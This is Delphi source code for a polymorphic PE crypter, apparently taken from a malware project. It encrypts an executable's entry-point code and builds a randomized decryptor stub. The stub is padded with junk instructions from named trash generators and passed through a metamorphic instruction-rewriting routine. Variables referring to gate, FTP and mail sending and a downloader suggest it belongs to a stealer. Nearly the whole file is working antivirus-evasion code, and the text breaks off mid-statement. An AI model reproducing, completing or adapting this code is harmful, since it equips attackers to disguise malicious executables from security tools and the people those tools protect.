unit DecryptorGeneracion;

interface

uses
  SysUtils, Classes, Windows, trashgen_lib, ETG, LDasm;

  procedure CryptCodeWriteDecryptor(fn:string);
  function  ror8 (X, N: byte): byte;
  function  rol8 (X, N: byte): byte;
  function  rnd32:dword;
  function  reg_random(bits:dword):byte;

type
  PCardinal = ^Cardinal;
  TSectName = packed array[0..IMAGE_SIZEOF_SHORT_NAME-1] of ansichar;
  TSectionsArray = packed array [0..0] of _IMAGE_SECTION_HEADER;
  PSectionsArray = ^TSectionsArray;
  _IMAGE_OPTIONAL_HEADER = packed record
  DataDirectory : packed array [0..IMAGE_NUMBEROF_DIRECTORY_ENTRIES-1] of TImageDataDirectory;
end;

  D_STRUC = packed record
    va:dword;
    opcode: array [0..14] of byte;
    op_size:byte;
    jmpaddr:dword;
    referredby:boolean;
  end;

  D_ARRAY = packed record
    d_arr:array[0..99999] of D_STRUC;
    count:dword;
  end;

  RELOC_STRUC = packed record
    reloc:dword;
    size:dword;
  end;

type
  TGenData = Packed record
    t: ansichar; // type
    k: byte; // key
  end;

const
  MAX_DECRYPT_CMD_REPEAT_CNT = 10;
  MIN_DECRYPT_CMD_REPEAT_CNT = 03;
  
var
  gd:array[1..MAX_DECRYPT_CMD_REPEAT_CNT] of TGenData;
  tb:array[1..64] of byte;

const
  RELOCS_MAX_COUNT = $1F;
//---
  _eax     = $00000001;
  _ecx     = $00000002;
  _edx     = $00000004;
  _ebx     = $00000008;
  _esp     = $00000010;
  _ebp     = $00000020;
  _esi     = $00000040;
  _edi     = $00000080;
  _all     = (not _ESP) and 255;
  _default = _eax;
//---
  ETG_MOVRR     =   1;//00000000000000000000000000000001;
  ETG_MOVRC     =   2;//00000000000000000000000000000010;
  ETG_MOVSXZX   =   4;//00000000000000000000000000000100;
  ETG_XCHG      =   8;//00000000000000000000000000001000;
  ETG_LEA       =   16;//00000000000000000000000000010000;
  ETG_TTTRR     =   32;//00000000000000000000000000100000;
  ETG_TTTRC     =   64;//00000000000000000000000001000000;
  ETG_INCDEC    =   128;//00000000000000000000000010000000;
  ETG_NOTNEG    =   256;//00000000000000000000000100000000;
  ETG_TESTRR    =   512;//00000000000000000000001000000000;
  ETG_TESTRC    =   1024;//00000000000000000000010000000000;
  ETG_IMUL      =   2048;//00000000000000000000100000000000;
  ETG_SHIFT     =   4096;//00000000000000000001000000000000;
  ETG_SHxD      =   8192;//00000000000000000010000000000000;
  ETG_BSWAP     =   16384;//00000000000000000100000000000000;
  ETG_XADD      =   32768;//00000000000000001000000000000000;
  ETG_BSx       =   65536;//00000000000000010000000000000000;
  ETG_BTx       =   131072;//00000000000000100000000000000000;
  ETG_JMPS      =   262144;//00000000000001000000000000000000;
  ETG_SEG       =   524288;//00000000000010000000000000000000;
  ETG_REP       =   1048576;//00000000000100000000000000000000;
  ETG_ALL       =   2097151;//00000000000111111111111111111111;
  ETG_DEFAULT   =   ETG_TTTRC;// used if no cmds specified;
//---
  TRASH_SLON            =   $00000000;
  TRASH_Z0MBIE          =   $00000001;
  TRASH_IDGAF           =   $FFFFFFFF;
  TRASH_SIZE_RANDOM     =   $FFFFFFFF;

var
//---
  hFile, hMap, hMapFile, FileSize, DataSect, DataSectRaw, EPSect, EPSectRaw, OldEPVA, CryptRaw,
  CryptDecryptorVA, CryptVA, CryptSize, CryptDecryptorRaw: dword;
  idh : PImageDosHeader;
  ifh : PImageFileHeader;
  ioh : PImageOptionalHeader;
  ish : PSectionsArray;
//---
  cmds: D_ARRAY;
//---
  relocs:array[$00..RELOCS_MAX_COUNT] of RELOC_STRUC;
  relocs_modified:array[$00..RELOCS_MAX_COUNT] of boolean;
  reloc_cnt,reloc_RAW:dword;
//---
  DATA_XOR_KEY:array[0..15] of byte;
  DATA_XOR_SIZE:DWORD;
//---
  // ZFE (Zero Filling Engine) data
  gate_send_size,gate_send_raw,
  ftp_send_size,ftp_send_raw,
  mail_send_size,mail_send_raw,
  dloader_size,dloader_raw:dword;


implementation

uses Unit3;

function reg_random(bits:dword):byte;
begin
  result:=0;
  case bits of
    8:  result:=random(4);
    32: result:=random(8);
  end;
end;

function rnd32:dword;
asm
  rdtsc
  xor eax, edx
  ror eax, $10
  xor eax, edx
end;

function ror8 (X, N: byte): byte;
asm
  mov al, X
  mov cl, N
  ror al, cl
end;

function rol8 (X, N: byte): byte;
asm
  mov al, X
  mov cl, N
  rol al, cl
end;

function ror32 (X: dword; N:byte): dword;
asm
  mov eax, X
  mov cl, N
  ror eax, cl
end;

function rol32 (X: dword; N:byte): dword;
asm
  mov eax, X
  mov cl, N
  rol eax, cl
end;

function TrashAddRndSize(p:dword;reg:dword;generator_index:dword;size:dword):dword;
var
  d1,d2:dword;
begin
  result:=0;
  if generator_index=TRASH_IDGAF then generator_index:=random(2);
  case generator_index of
    // TrashGen by slon � FILLS BUFFER COMPLETELY
    TRASH_SLON:
       begin
         if size=TRASH_SIZE_RANDOM then
         d1:=5+random(10)+random(15)
         else d1:=size;
         Gen_Garbage(p,d1,reg);
         result:=d1;
       end;
    // Executable Trash Generator by Z0MBiE � FILL BUFFER NOT COMPLETLY, LESS
    TRASH_Z0MBIE:
       begin
         if size=TRASH_SIZE_RANDOM then
         d1:=5+random(10)+random(15)
         else d1:=size;
         d2:=ETG.gen(p,d1,_ALL-reg,_ALL);
         result:=d2;
       end; 
  end;
end;

function GenDecryptCommands(r:byte;binary_exclude_register:dword):dword;
// Generate XORs, ADDs, etc [+] crypt code
var
  d,i,i2,dec_size,r1:dword;
  b:byte;
  key:byte;
  LocalCryptRaw:dword;
begin
  result:=0;
  dec_size:=0;
  randomize;
  repeat r1:=random(MAX_DECRYPT_CMD_REPEAT_CNT); until r1>MIN_DECRYPT_CMD_REPEAT_CNT;
  for i:=1 to r1 do
  begin
    repeat key:=random(256);until key<>0;
    case random(6) of
      0: begin
           // XOR
           dec_size:=3;
           tb[01]:=$80;tb[02]:=$30;tb[03]:=$00;
           tb[02]:=tb[02] or r;tb[03]:=key;
           gd[i].t:='X';gd[i].k:=key;
         end;
      1: begin
           // ADD
           dec_size:=3;
           tb[01]:=$80;tb[02]:=$00;tb[03]:=$00;
           tb[02]:=tb[02] or r;tb[03]:=key;
           gd[i].t:='A';gd[i].k:=key;
         end;
      2: begin
           // SUB
           dec_size:=3;
           tb[01]:=$80;tb[02]:=$28;tb[03]:=$00;
           tb[02]:=tb[02] or r;tb[03]:=key;
           gd[i].t:='S';gd[i].k:=key;
         end;
      3: begin
           // NOT
           dec_size:=2;
           tb[01]:=$F6;tb[02]:=$10;
           tb[02]:=tb[02] or r;
           gd[i].t:='N';
         end;
      4: begin
           // ROR
           dec_size:=3;
           tb[01]:=$C0;tb[02]:=$08;tb[03]:=$00;
           tb[02]:=tb[02] or r;tb[03]:=key;
           gd[i].t:='R';gd[i].k:=key;
         end;
      5: begin
           // ROL
           dec_size:=3;
           tb[01]:=$C0;tb[02]:=$00;tb[03]:=$00;
           tb[02]:=tb[02] or r;tb[03]:=key;
           gd[i].t:='L';gd[i].k:=key;
         end;
    end;
    d:=TrashAddRndSize(CryptDecryptorRaw,_esp or binary_exclude_register,TRASH_IDGAF,TRASH_SIZE_RANDOM);
    CryptDecryptorRaw:=CryptDecryptorRaw+d;
    result:=result+d;
    MoveMemory(pointer(CryptDecryptorRaw), @tb, dec_size);
    inc(CryptDecryptorRaw,dec_size);
    inc(result,dec_size);
  end;

  for i:=r1 downto 1 do
  begin
    case gd[i].t of
      'X': begin
             LocalCryptRaw:=CryptRaw;
             for i2:=0 to CryptSize-1 do
             begin
               MoveMemory(@b, pointer(LocalCryptRaw), sizeof(b));
               b:=b xor gd[i].k;
               MoveMemory(pointer(LocalCryptRaw), @b, sizeof(b));
               inc(LocalCryptRaw,1);
             end;
           end;
      'A': begin
             LocalCryptRaw:=CryptRaw;
             for i2:=0 to CryptSize-1 do
             begin
               MoveMemory(@b, pointer(LocalCryptRaw), sizeof(b));
               b:=b - gd[i].k;
               MoveMemory(pointer(LocalCryptRaw), @b, sizeof(b));
               inc(LocalCryptRaw,1);
             end;
           end;
      'S': begin
             LocalCryptRaw:=CryptRaw;
             for i2:=0 to CryptSize-1 do
             begin
               MoveMemory(@b, pointer(LocalCryptRaw), sizeof(b));
               b:=b + gd[i].k;
               MoveMemory(pointer(LocalCryptRaw), @b, sizeof(b));
               inc(LocalCryptRaw,1);
             end;
           end;
      'N': begin
             LocalCryptRaw:=CryptRaw;
             for i2:=0 to CryptSize-1 do
             begin
               MoveMemory(@b, pointer(LocalCryptRaw), sizeof(b));
               b:=not b;
               MoveMemory(pointer(LocalCryptRaw), @b, sizeof(b));
               inc(LocalCryptRaw,1);
             end;
           end;
      'R': begin
             LocalCryptRaw:=CryptRaw;
             for i2:=0 to CryptSize-1 do
             begin
               MoveMemory(@b, pointer(LocalCryptRaw), sizeof(b));
               b:=rol8(b,gd[i].k);
               MoveMemory(pointer(LocalCryptRaw), @b, sizeof(b));
               inc(LocalCryptRaw,1);
             end;
           end;
      'L': begin
             LocalCryptRaw:=CryptRaw;
             for i2:=0 to CryptSize-1 do
             begin
               MoveMemory(@b, pointer(LocalCryptRaw), sizeof(b));
               b:=ror8(b,gd[i].k);
               MoveMemory(pointer(LocalCryptRaw), @b, sizeof(b));
               inc(LocalCryptRaw,1);
             end;
           end;
    end;
  end;
end;

function BoolToStr(const value : boolean) : string;
const Values : array [ boolean ] of string = ( '0', '1' ) ;
begin
   Result := Values [ value ] ;
end;

function IsInRelocs(va:dword):boolean;
var
  i:integer;
begin
  result:=false;
  for i:=1 to reloc_cnt do
  begin
    if relocs[i-1].reloc=va then
    begin
      result:=true;
      break;
    end;
  end;
end;

function ModifyReloc(va:dword;val:dword):boolean;
var
  i:integer;
begin
  result:=false;
  for i:=1 to reloc_cnt do
  begin
    if (relocs[i-1].reloc=va) and (relocs_modified[i-1]=false) then
    begin
      relocs[i-1].reloc:=relocs[i-1].reloc+val;
      relocs_modified[i-1]:=true;
      break;
    end;
  end;
end;

procedure FixNextCommands(va:dword;delta:dword);
label
  fnc_label1;
var
  i2:dword;
begin
  if delta>0 then
  begin
    with cmds do
    begin
      FillChar(relocs_modified,sizeof(relocs_modified),$00);
      for i2:=0 to cmds.count-1 do
      begin
        if (d_arr[i2].jmpaddr<>0) then
        begin
          // jmp FORWARD over morph opcode
          if (VA > d_arr[i2].VA) and (VA < d_arr[i2].jmpaddr) then
          begin
            d_arr[i2].jmpaddr:=d_arr[i2].jmpaddr+delta;
            goto fnc_label1;
          end;
          // jmp BACK or FORWARD after morph opcode
          if (VA < d_arr[i2].VA) and (VA < d_arr[i2].jmpaddr) then
          begin
            d_arr[i2].jmpaddr:=d_arr[i2].jmpaddr+delta;
            goto fnc_label1;
          end;
          fnc_label1:
        end;
        // Fix next commands' VA's
        if d_arr[i2].VA>VA then
        begin
          if IsInRelocs(d_arr[i2].VA) then
          // Modify only 1 time per [i2] loop
          ModifyReloc(d_arr[i2].VA,delta);
          d_arr[i2].VA:=d_arr[i2].VA+delta;
        end;
      end;
    end;  
  end;
end;

procedure MotherOrphanRocksPerHour;
label
  get_addr_done,
  assembly_jmps_done,
  fix_some_shit,
  convert_jumps_done,
  morph_done;
var
  cmd_size,i,p,d,delta:dword;
  b1,reg1:byte;
  d1,d2,d3:dword;
begin
  // CryptRaw - EP mapped here VA
  // CryptSize - size of code!
  // CryptVA - 00403038 etc
  FillChar(cmds,sizeof(cmds),$00);
  p:=CryptRaw;
  // Scan code and fill D_STRUC structures
  i:=0;
  repeat
    // Get Length
    cmd_size:=SizeOfCode(pointer(p),nil);
    cmds.d_arr[cmds.count].op_size:=cmd_size;
    // Calc VA
    cmds.d_arr[cmds.count].va:=CryptVA+i;
    // Get Opcode
    MoveMemory(@cmds.d_arr[cmds.count].opcode, pointer(p), cmds.d_arr[cmds.count].op_size);
    // Scan jmp|calls, refs and ref's addresses
    if (cmds.d_arr[cmds.count].opcode[00] in [$70..$7F,$EB]) then
    begin
      if cmds.d_arr[cmds.count].opcode[01] in [$00..$7F] then
      cmds.d_arr[cmds.count].jmpaddr:=cmds.d_arr[cmds.count].va+cmds.d_arr[cmds.count].opcode[01]+2
      else
      cmds.d_arr[cmds.count].jmpaddr:=cmds.d_arr[cmds.count].va-((-cmds.d_arr[cmds.count].opcode[01]) and $FF )+2;
      goto get_addr_done;
    end;
    if (cmds.d_arr[cmds.count].opcode[00]=$0F) and (cmds.d_arr[cmds.count].opcode[01] in [$80..$8F]) then
    begin
      MoveMemory(@d, @cmds.d_arr[cmds.count].opcode[$02], sizeof(d));
      cmds.d_arr[cmds.count].jmpaddr:=cmds.d_arr[cmds.count].va+d+6;
      goto get_addr_done;
    end;
    if (cmds.d_arr[cmds.count].opcode[00] in [$E8,$E9]) then
    begin
      MoveMemory(@d, @cmds.d_arr[cmds.count].opcode[01], sizeof(d));
      cmds.d_arr[cmds.count].jmpaddr:=cmds.d_arr[cmds.count].va+d+5;
      goto get_addr_done;
    end;
    get_addr_done:
    // routine
    cmds.count:=cmds.count+1;
    p:=p+cmd_size;
    i:=i+cmd_size;
  until i>(CryptSize-1);

  // Fill referredby booleans
  {for i:=0 to cmds.count-1 do
  begin
    if cmds.d_arr[i].jmpaddr<>0 then
    begin
      for i2:=0 to cmds.count-1 do
      begin
        if cmds.d_arr[i2].va=cmds.d_arr[i].jmpaddr then
        cmds.d_arr[i2].referredby:=true;
      end;
    end;
  end;}

  // Convert SHORT -> LONG je/jmp/etc
  for i:=0 to cmds.count-1 do
  begin
    delta:=0;
    with cmds do
    begin
      // Conditional jmps
      if d_arr[i].opcode[00] in [$70..$7F] then
      begin
        // SHORT JUMP forward
        if d_arr[i].opcode[01] in [$00..$7F] then
        begin
          d_arr[i].opcode[01]:=d_arr[i].opcode[00]+$10;
          d_arr[i].opcode[00]:=$0F;
          d_arr[i].op_size:=6;
          delta:=d_arr[i].op_size-2;
          d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end
        else
        // SHORT JUMP backward
        begin
          d_arr[i].opcode[01]:=d_arr[i].opcode[00]+$10;
          d_arr[i].opcode[00]:=$0F;
          d_arr[i].op_size:=6;
          delta:=d_arr[i].op_size-2;
        end;
        goto convert_jumps_done;
      end;
      // Non-conditional jmps
      if d_arr[i].opcode[00] = $EB then
      begin
        // SHORT JUMP forward
        if d_arr[i].opcode[01] in [$00..$7F] then
        begin
          d_arr[i].opcode[00]:=$E9;
          d_arr[i].op_size:=5;
          delta:=d_arr[i].op_size-2;
          d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end
        else
        // SHORT JUMP backward
        //============================
        begin
          d_arr[i].opcode[00]:=$E9;
          d_arr[i].op_size:=5;
          delta:=d_arr[i].op_size-2;
        end;
        //============================
        goto convert_jumps_done;
      end;
      convert_jumps_done:
      // Fix next commands
      FixNextCommands(d_arr[i].VA,delta);
    end;
    // FIX VA's AND SIZES variables!!!!!
    CryptSize:=CryptSize+delta;
    CryptDecryptorVA:=CryptDecryptorVA+delta;
    CryptDecryptorRaw:=CryptDecryptorRaw+delta;
  end;

  // M.O.R.P.H.!
  for i:=0 to cmds.count-1 do
  begin
    delta:=0;
    with cmds do
    begin
      // XOR EAX, EAX -> MOV EAX, 0
      if (d_arr[i].op_size=2) and (d_arr[i].opcode[00] in [$33]) and (d_arr[i].opcode[01] in [$C0]) then
      begin
        if random(2)=1 then
        begin
          d_arr[i].opcode[00]:=$B8;
          FillChar(d_arr[i].opcode[01],4,$00);
          d_arr[i].op_size:=5;
          delta:=d_arr[i].op_size-2;
          d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end;
        goto morph_done;
      end;
      // INC %REG% -> ADD %REG%, 1
      // INC r16/32 -> ADD r/m16/32 imm8
      if (d_arr[i].op_size=1) and (d_arr[i].opcode[00] in [$40..$47]) then
      begin
        if random(2)=1 then
        begin
          reg1:=d_arr[i].opcode[00] and 7;
          d_arr[i].opcode[00]:=$83;
          d_arr[i].opcode[01]:=$C0 or reg1;
          d_arr[i].opcode[02]:=$01;
          d_arr[i].op_size:=3;
          delta:=d_arr[i].op_size-1;
          d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end;
        goto morph_done;
      end;
      // ADD %REG%, byte -> SUB %REG%, -byte
      // ADD r/m16/32 imm8 -> SUB	r/m16/32 imm8
      if (d_arr[i].op_size=3) and (d_arr[i].opcode[00] in [$83]) and (d_arr[i].opcode[01] in [$C0..$C7]) then
      begin
        if random(2)=1 then
        begin
          reg1:=d_arr[i].opcode[01] and 7;
          b1:=-d_arr[i].opcode[02];
          d_arr[i].opcode[00]:=$83;
          d_arr[i].opcode[01]:=$E8 or reg1;
          d_arr[i].opcode[02]:=b1;
          d_arr[i].op_size:=3;
          //delta:=d_arr[i].op_size-1;
          //d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end;
        goto morph_done;
      end;
      // PUSH 05 -> PUSH 00.00.00.05
      // PUSH	imm8 -> PUSH imm16/32
      if (d_arr[i].op_size=2) and (d_arr[i].opcode[00] in [$6A]) then
      begin
        if random(2)=1 then
        begin
          b1:=d_arr[i].opcode[01];
          d_arr[i].opcode[00]:=$68;
          d_arr[i].opcode[01]:=b1;
          FillChar(d_arr[i].opcode[02],3,$00);
          d_arr[i].op_size:=5;
          delta:=d_arr[i].op_size-2;
          d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end;
        goto morph_done;
      end;
      // DEC %REG% -> SUB %REG%, 1
      // DEC r16/32 -> SUB r/m16/32 imm8
      if (d_arr[i].op_size=1) and (d_arr[i].opcode[00] in [$48..$4F]) then
      begin
        if random(2)=1 then
        begin
          reg1:=d_arr[i].opcode[00] and 7;
          d_arr[i].opcode[00]:=$83;
          d_arr[i].opcode[01]:=$E8 or reg1;
          d_arr[i].opcode[02]:=$01;
          d_arr[i].op_size:=3;
          delta:=d_arr[i].op_size-1;
          d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end;
        goto morph_done;
      end;
      // PUSH %imm32% -> PUSH %imm32% + XXX [ESP], PUSH %imm32%
      // PUSH	imm16/32 -> PUSH imm16/32 + XXX [ESP}, imm16/32
      if (d_arr[i].op_size=5) and (d_arr[i].opcode[00] in [$68]) then
      begin
        if random(3)=1 then
        begin
          // choose - xor, add or sub
          d3:=random(3);
          // create opcode
          MoveMemory(@d1, @d_arr[i].opcode[01], sizeof(d1));
          d2:=random(-1);
          case d3 of
            // XOR
            0:d1:=d1 xor d2;
            // ADD
            1:d1:=d1 - d2;
            // SUB
            2:d1:=d1 + d2;
          end;
          d_arr[i].opcode[00]:=$68;
          MoveMemory(@d_arr[i].opcode[01], @d1, sizeof(d1));
          d_arr[i].opcode[05]:=$81;
          case d3 of
            0:d_arr[i].opcode[06]:=$34;
            1:d_arr[i].opcode[06]:=$04;
            2:d_arr[i].opcode[06]:=$2C;
          end;
          d_arr[i].opcode[07]:=$24;
          MoveMemory(@d_arr[i].opcode[08], @d2, sizeof(d2));
          d_arr[i].op_size:=12;
          delta:=d_arr[i].op_size-5;
          d_arr[i].jmpaddr:=d_arr[i].jmpaddr+delta;
        end;
        goto morph_done;

      end;
      {if ...
      endif}
      morph_done:
      // Fix next commands
      FixNextCommands(d_arr[i].VA,delta);
    end;
    // FIX VA's AND SIZES variables!!!!!
    CryptSize:=CryptSize+delta;
    CryptDecryptorVA:=CryptDecryptorVA+delta;
    CryptDecryptorRaw:=CryptDecryptorRaw+delta;
  end;

  // Assembly code together!
  p:=CryptRaw;
  for i:=0 to cmds.count-1 do
  begin
    // Move JMPADDR -> OPCODE
    if cmds.d_arr[i].jmpaddr<>0 then
    begin
      if (cmds.d_arr[i].opcode[00]=$0F) and (cmds.d_arr[i].opcode[01] in [$80..$8F]) then
      begin
        d:=cmds.d_arr[i].jmpaddr-cmds.d_arr[i].va-6;
        MoveMemory(@cmds.d_arr[i].opcode[02], @d, sizeof(d));
        goto assembly_jmps_done;
      end;
      if (cmds.d_arr[i].opcode[00] in [$E8,$E9]) then
      begin
        d:=cmds.d_arr[i].jmpaddr-cmds.d_arr[i].va-5;
        MoveMemory(@cmds.d_arr[i].opcode[01], @d, sizeof(d));
        goto assembly_jmps_done;
      end;
      assembly_jmps_done:
    end;
    // Write Opcode
    MoveMemory(pointer(p), @cmds.d_arr[i].opcode, cmds.d_arr[i].op_size);
    p:=p+cmds.d_arr[i].op_size;
  end;
  
end;

procedure StubGenerate;
var
  reg,b,b1,b2:byte;
  d,dd,dd2,jnz_data,breg: dword;
  cb:array[1..32] of byte;
  CryptDecryptorRaw_old,csize:dword;
begin
  csize:=0;
  breg:=0;
  randomize;

  //MotherOrphanRocksPerHour; // M.O.R.P.H! it changes CryptDecryptorRaw, CryptDecryptorVA, CryptSize!!!

  CryptDecryptorRaw_old:=CryptDecryptorRaw;

  //////////////////// START OF LOOP
  begin

    // Generate register for usage
    repeat
      reg:=random(8);
    until (reg in [0..3]) or (reg in [6..7]);
    case reg of
      0: breg:=_EAX;
      1: breg:=_ECX;
      2: breg:=_EDX;
      3: breg:=_EBX;
      4: breg:=_ESP;
      5: breg:=_EBP;
      6: breg:=_ESI;
      7: breg:=_EDI;
    end;

    CryptDecryptorRaw:=CryptDecryptorRaw+TrashAddRndSize(CryptDecryptorRaw,_ESP,TRASH_IDGAF,TRASH_SIZE_RANDOM);

    // MOV DWORD PTR [ESP], 580B
    case random(2) of
      0: begin
           csize:=7;
           cb[01]:=$C7;cb[02]:=$04;cb[03]:=$24;cb[04]:=$00;cb[05]:=$00;cb[06]:=$00;cb[07]:=$00;
           MoveMemory(@cb[04],@CryptSize,sizeof(CryptSize));
         end;
      1: begin
           csize:=14;
           cb[01]:=$C7;cb[02]:=$04;cb[03]:=$24;cb[04]:=$00;cb[05]:=$00;cb[06]:=$00;cb[07]:=$00;
           cb[08]:=$81;cb[09]:=$04;cb[10]:=$24;cb[11]:=$00;cb[12]:=$00;cb[13]:=$00;cb[14]:=$00;
           MoveMemory(@cb[11],@CryptSize,sizeof(CryptSize));
         end;
    end;
    MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);

    inc(CryptDecryptorRaw,csize);

    CryptDecryptorRaw:=CryptDecryptorRaw+TrashAddRndSize(CryptDecryptorRaw,_ESP,TRASH_IDGAF,TRASH_SIZE_RANDOM);

    // MOV EAX, 0040100C
    case random(5) of
      // MOV EAX, (0040100C xor %random%)
      // XOR EAX, %random%
      0: begin
           csize:=11;
           dd:=rnd32;
           dd2:=dd xor CryptVA;
           cb[01]:=$B8 or reg;cb[02]:=$00;cb[03]:=$00;cb[04]:=$00;cb[05]:=$00;
           cb[06]:=$81;cb[07]:=$F0 or reg;cb[08]:=$00;cb[09]:=$00;cb[10]:=$00;cb[11]:=$00;
           MoveMemory(@cb[02],@dd2,sizeof(dd2));
           MoveMemory(@cb[08],@dd,sizeof(dd));
         end;
      // MOV EAX, (0040100C - %random%)
      // ADD EAX, %random%
      1: begin
         csize:=11;
         dd:=rnd32;
         dd2:=CryptVA-dd;
         cb[01]:=$B8 or reg;cb[02]:=$00;cb[03]:=$00;cb[04]:=$00;cb[05]:=$00;
         cb[06]:=$81;cb[07]:=$C0 or reg;cb[08]:=$00;cb[09]:=$00;cb[10]:=$00;cb[11]:=$00;
         MoveMemory(@cb[02],@dd2,sizeof(dd2));
         MoveMemory(@cb[08],@dd,sizeof(dd));
         end;
      // MOV EAX, (0040100C + %random%)
      // SUB EAX, %random%
      2: begin
           csize:=11;
           dd:=rnd32;
           dd2:=CryptVA+dd;
           cb[01]:=$B8 or reg;cb[02]:=$00;cb[03]:=$00;cb[04]:=$00;cb[05]:=$00;
           cb[06]:=$81;cb[07]:=$E8 or reg;cb[08]:=$00;cb[09]:=$00;cb[10]:=$00;cb[11]:=$00;
           MoveMemory(@cb[02],@dd2,sizeof(dd2));
           MoveMemory(@cb[08],@dd,sizeof(dd));
         end;
      // MOV EAX, (0040100C rol %random8%)
      // ROR EAX, %random8%
      3: begin
           csize:=8;
           b1:=LoByte(rnd32);
           dd2:=rol32(CryptVA,b1);
           cb[01]:=$B8 or reg;cb[02]:=$00;cb[03]:=$00;cb[04]:=$00;cb[05]:=$00;
           cb[06]:=$C1;cb[07]:=$C8 or reg;cb[08]:=$00;
           MoveMemory(@cb[02],@dd2,sizeof(dd2));
           MoveMemory(@cb[08],@b1,sizeof(b1));
         end;
      // MOV EAX, (0040100C ror %random8%)
      // ROL EAX, %random8%
      4: begin
           csize:=8;
           b1:=LoByte(rnd32);
           dd2:=ror32(CryptVA,b1);
           cb[01]:=$B8 or reg;cb[02]:=$00;cb[03]:=$00;cb[04]:=$00;cb[05]:=$00;
           cb[06]:=$C1;cb[07]:=$C0 or reg;cb[08]:=$00;
           MoveMemory(@cb[02],@dd2,sizeof(dd2));
           MoveMemory(@cb[08],@b1,sizeof(b1));
         end;
    end;
    MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
    inc(CryptDecryptorRaw,csize);

    //encrypt code
    jnz_data:=GenDecryptCommands(reg,breg);

    d:=TrashAddRndSize(CryptDecryptorRaw,_ESP or breg,TRASH_IDGAF,TRASH_SIZE_RANDOM);
    CryptDecryptorRaw:=CryptDecryptorRaw+d;
    jnz_data:=jnz_data+d;

    // increment register
    case random(4) of
      // inc %reg32%
      0: begin
           csize:=1;
           cb[01]:=$40 or reg;
         end;
      // add %reg32%, 1
      1: begin
           csize:=3;
           cb[01]:=$83;cb[02]:=$C0 or reg;cb[03]:=$01;
         end;
      // sub %reg32%, -1
      2: begin
           csize:=3;
           cb[01]:=$83;cb[02]:=$E8 or reg;cb[03]:=$FF;
         end;
      // lea %reg32%, dword ptr [%reg32%+1]
      3: begin
           csize:=3;
           b:=$40 or reg;b:=ror8(b,3);b:=b or reg;b:=rol8(b,3);
           cb[01]:=$8D;cb[02]:=b;cb[03]:=$01;
         end;
    end;
    MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
    inc(CryptDecryptorRaw,csize);
    jnz_data:=jnz_data+csize;

    d:=TrashAddRndSize(CryptDecryptorRaw,_ESP or breg,TRASH_IDGAF,TRASH_SIZE_RANDOM);
    CryptDecryptorRaw:=CryptDecryptorRaw+d;
    jnz_data:=jnz_data+d;

    // DEC DWORD PTR [ESP]; JNZ
    case random(2) of
      0: begin
           csize:=9;
           cb[01]:=$FF;cb[02]:=$0C;cb[03]:=$24;cb[04]:=$0F;cb[05]:=$85;
           cb[06]:=$F7;cb[07]:=$FF;cb[08]:=$FF;cb[09]:=$FF;
           MoveMemory(@dd, @cb[06], sizeof(dd));
           dd:=dd-jnz_data;
           MoveMemory(@cb[06], @dd, sizeof(dd));
         end;
      1: begin
           csize:=10;
           cb[01]:=$83;cb[02]:=$2C;cb[03]:=$24;cb[04]:=$01;cb[05]:=$0F;cb[06]:=$85;
           cb[07]:=$F6;cb[08]:=$FF;cb[09]:=$FF;cb[10]:=$FF;
           MoveMemory(@dd, @cb[07], sizeof(dd));
           dd:=dd-jnz_data;
           MoveMemory(@cb[07], @dd, sizeof(dd));
         end;
    end;
    MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
    inc(CryptDecryptorRaw,csize);

    CryptDecryptorRaw:=CryptDecryptorRaw+TrashAddRndSize(CryptDecryptorRaw,_ESP,TRASH_IDGAF,TRASH_SIZE_RANDOM);
  end;

  // Return from decryptor to main code
  case random(4) of
    //jmp via stack
    0:
      begin
        // PUSH 004016BF
        case random(2) of
          0: begin
               csize:=5;
               cb[01]:=$68;cb[02]:=$00;cb[03]:=$00;cb[04]:=$00;cb[05]:=$00;
               MoveMemory(@cb[02],@OldEPVA,sizeof(OldEPVA));
             end;
          1: begin
               csize:=10;
               cb[01]:=$83;cb[02]:=$EC;cb[03]:=$04;
               cb[04]:=$C7;cb[05]:=$04;cb[06]:=$24;cb[07]:=$00;cb[08]:=$00;cb[09]:=$00;cb[10]:=$00;
               MoveMemory(@cb[07],@OldEPVA,sizeof(OldEPVA));
             end;
        end;
        MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
        inc(CryptDecryptorRaw,csize);

        CryptDecryptorRaw:=CryptDecryptorRaw+TrashAddRndSize(CryptDecryptorRaw,_ESP,TRASH_IDGAF,TRASH_SIZE_RANDOM);

        // RETN
        case random(3) of
          0: begin
               // ret
               csize:=1;
               cb[01]:=$C3;
             end;
          1: begin
               // add esp, 4 / jmp [esp-4]
               csize:=7;
               cb[01]:=$83;cb[02]:=$C4;cb[03]:=$04;
               cb[04]:=$FF;cb[05]:=$64;cb[06]:=$24;cb[07]:=$FC;
             end;
          2: begin
               // add esp, 4 / call [esp-4]
               csize:=7;
               cb[01]:=$83;cb[02]:=$C4;cb[03]:=$04;
               cb[04]:=$FF;cb[05]:=$54;cb[06]:=$24;cb[07]:=$FC;
             end;
        end;
        MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
        inc(CryptDecryptorRaw,csize);
      end;
    // mov reg, offset / JMP %REG%
    1:
      begin
        csize:=7;
        repeat
        b2:=reg_random(32);
        until (b2 in [0..3]) or (b2 in [6..7]);
        cb[01]:=$B8 or b2;cb[02]:=$00;cb[03]:=$00;cb[04]:=$00;cb[05]:=$00;
        cb[06]:=$FF;cb[07]:=$E0 or b2;
        MoveMemory(@cb[02],@OldEPVA,sizeof(OldEPVA));
        MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
        inc(CryptDecryptorRaw,csize);
      end;
    // xor %reg%, %reg% / jz 401038
    2:
      begin
        csize:=8;
        repeat
        b2:=reg_random(32);
        until (b2 in [0..3]) or (b2 in [6..7]);
          dd:=-8{2:sizeof 1st XOR,6:sizeof 2nd JZ}-dword(CryptDecryptorVA)
